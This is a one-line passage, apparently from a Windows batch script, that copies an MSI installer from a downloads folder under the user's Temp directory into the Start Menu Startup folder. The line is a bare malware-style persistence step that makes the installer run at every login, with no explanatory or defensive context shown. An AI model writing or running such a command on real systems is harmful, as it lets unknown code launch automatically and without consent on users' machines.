...
copy "C:\Users\%username%\AppData\Local\Temp\downloadaccessalex\startup.msi" "C:\users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
